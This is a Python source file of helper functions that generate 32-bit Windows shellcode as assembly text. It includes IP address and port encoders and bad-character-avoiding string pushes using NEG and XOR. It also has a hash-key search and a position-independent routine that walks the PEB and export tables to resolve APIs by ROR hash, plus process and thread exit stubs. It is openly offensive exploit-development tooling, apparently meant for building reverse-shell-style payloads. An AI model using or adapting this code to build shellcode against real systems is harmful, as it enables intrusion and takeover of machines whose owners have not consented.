DEFAULT_HASH_KEY = 0xE


def convert_ip_addr_hex(ip_addr):
    import ipaddress

    return hex(
        int.from_bytes(int(ipaddress.IPv4Address(ip_addr)).to_bytes(4, "little"), "big")
    )


def convert_port_hex(port):
    return hex(int.from_bytes(int(port).to_bytes(2, "little"), "big"))


def convert_tag_hex(tag):
    assert len(tag) == 8 and tag[:4] == tag[4:]
    return hex(int.from_bytes(tag[:4].encode(), "little"))


def convert_neg(dword):
    return ((-int.from_bytes(dword, "little")) & 0xFFFFFFFF).to_bytes(4, "little")


def ror(byte, count):
    return ((byte << (0x20 - count)) | (byte >> count)) & 0xFFFFFFFF


def compute_hash(esi, key):
    edx = ord(esi[0])
    for eax in esi[1:]:
        edx = ror(edx, key) + ord(eax)
    return edx


def push_hash(function_name, key=DEFAULT_HASH_KEY):
    hash = compute_hash(function_name, key)
    return f"push  {hex(hash)};"


def find_hash_key(function_names, bad_chars):
    for key in range(0x20):
        if not any(
            any(c in bad_chars for c in compute_hash(f_name, key).to_bytes(4, "little"))
            for f_name in function_names
        ):
            return key

    print(
        f"# Cannot find a good hash key, use default key ({hex(DEFAULT_HASH_KEY)}) to compute hash"
    )
    return DEFAULT_HASH_KEY


def push_string(input_str, bad_chars):
    def gen_push_code(dword):
        if not any(c in bad_chars for c in dword):
            return f'push  {hex(int.from_bytes(dword, "little"))};'

    def gen_neg_code(dword):
        neg_dword = convert_neg(dword)
        if not any(c in bad_chars for c in neg_dword):
            return (
                f'mov   eax, {hex(int.from_bytes(neg_dword, "little"))};'
                f"neg   eax;"
                f"push  eax;"
            )

    def gen_xor_code(dword):
        xor_dword_1 = xor_dword_2 = b""
        for i in range(4):
            for xor_byte_1 in range(256):
                xor_byte_2 = dword[i] ^ xor_byte_1
                if (xor_byte_1 not in bad_chars) and (xor_byte_2 not in bad_chars):
                    xor_dword_1 += bytes([xor_byte_1])
                    xor_dword_2 += bytes([xor_byte_2])
                    break
            else:
                return None

        return (
            f'mov   eax, {hex(int.from_bytes(xor_dword_1, "little"))};'
            f'xor   eax, {hex(int.from_bytes(xor_dword_2, "little"))};'
            f"push  eax;"
        )

    input_bytes = input_str.encode() + b"\x00"

    code = ""
    for i in range(0, len(input_bytes), 4)[::-1]:
        pad_byte = [c for c in range(256) if c not in bad_chars][0]
        dword = input_bytes[i : i + 4]
        dword += bytes([pad_byte]) * (4 - len(dword))

        new_code = gen_push_code(dword)
        if not new_code:
            new_code = gen_neg_code(dword)
        if not new_code:
            new_code = gen_xor_code(dword)
        if not new_code:
            raise Exception(f"cannot push dword: {dword}")
        code += new_code

    return code


def find_and_call(key=DEFAULT_HASH_KEY):
    return f"""
    find_and_call_shorten:
        jmp find_and_call_shorten_bnc   // Short jump

    find_and_call_ret:
        pop esi                         // POP the return address from the stack
        mov   [ebp+0x4], esi            // Save find_function address for later usage
        jmp find_and_call_end

    find_and_call_shorten_bnc:
        call find_and_call_ret          // Relative CALL with negative offset

    find_and_call:
        pushad                          // Save all registers
        xor   ecx, ecx                  // ECX = 0
        mov   esi,fs:[ecx+0x30]         // ESI = &(PEB) ([FS:0x30])
        mov   esi,[esi+0x0C]            // ESI = PEB->Ldr
        mov   esi,[esi+0x1C]            // ESI = PEB->Ldr.InInitOrder

    next_module:
        mov   ebx, [esi+0x08]           // EBX = InInitOrder[X].base_address
        push  esi

    find_function:
        mov   eax, [ebx+0x3C]           // Offset to PE Signature
        mov   edi, [ebx+eax+0x78]       // Export Table Directory RVA
        add   edi, ebx                  // Export Table Directory VMA
        mov   ecx, [edi+0x18]           // NumberOfNames
        mov   eax, [edi+0x20]           // AddressOfNames RVA
        add   eax, ebx                  // AddressOfNames VMA
        mov   [ebp-0x4], eax            // Save AddressOfNames VMA for later

    find_function_loop:
        jecxz get_next_module           // Jump to the end if ECX is 0
        dec   ecx                       // Decrement our names counter
        mov   eax, [ebp-0x4]            // Restore AddressOfNames VMA
        mov   esi, [eax+ecx*0x4]        // Get the RVA of the symbol name
        add   esi, ebx                  // Set ESI to the VMA of the current symbol name

    compute_hash:
        xor   eax, eax                  // EAX = 0
        cdq                             // EDX = 0
        cld                             // Clear direction

    compute_hash_again:
        lodsb                           // Load the next byte from esi into al
        test  al, al                    // Check for NULL terminator
        jz    compute_hash_finished     // If the ZF is set, we've hit the NULL term
        ror   edx, {hex(key)}           // Rotate edx key bits to the right
        add   edx, eax                  // Add the new byte to the accumulator
        jmp   compute_hash_again        // Next iteration

    compute_hash_finished:

    find_function_compare:
        cmp   edx, [esp+0x28]           // Compare the computed hash with the requested hash
        jnz   find_function_loop        // If it doesn't match go back to find_function_loop
        mov   edx, [edi+0x24]           // AddressOfNameOrdinals RVA
        add   edx, ebx                  // AddressOfNameOrdinals VMA
        mov   cx,  [edx+2*ecx]          // Extrapolate the function's ordinal
        mov   edx, [edi+0x1c]           // AddressOfFunctions RVA
        add   edx, ebx                  // AddressOfFunctions VMA
        mov   eax, [edx+4*ecx]          // Get the function RVA
        add   eax, ebx                  // Get the function VMA
        mov   [esp+0x20], eax           // Overwrite stack version of eax from pushad

    call_function:
        pop   esi
        popad                           // Restore registers
        pop   ecx                       // Escape return address
        pop   edx                       // Remove hash
        push  ecx                       // Set return address
        jmp   eax                       // Call found function

    get_next_module:
        pop   esi
        mov   esi, [esi]                // ESI = InInitOrder[X].flink (next)
        jmp next_module

    find_and_call_end:
    """


def call_exit_func(func, hash_key):
    if func == "TerminateProcess":
        return f"""
        call_terminateprocess:              // BOOL TerminateProcess([in] HANDLE hProcess, [in] UINT uExitCode);
            xor   ecx, ecx                  // ECX = 0
            push  ecx                       // uExitCode = 0
            push  0xffffffff                // hProcess = 0xffffffff
            {push_hash('TerminateProcess', hash_key)}
            call dword ptr [ebp+0x04]       // Call TerminateProcess
        """

    elif func == "RtlExitUserThread":
        return f"""
        call_rtlexituserthread:             // RtlExitUserThread(dwThreadExitCode);
            xor   ecx, ecx                  // ECX = 0
            push  ecx                       // dwThreadExitCode = 0
            {push_hash('RtlExitUserThread', hash_key)}
            call dword ptr [ebp+0x04]       // Call RtlExitUserThread
        """

    return ""
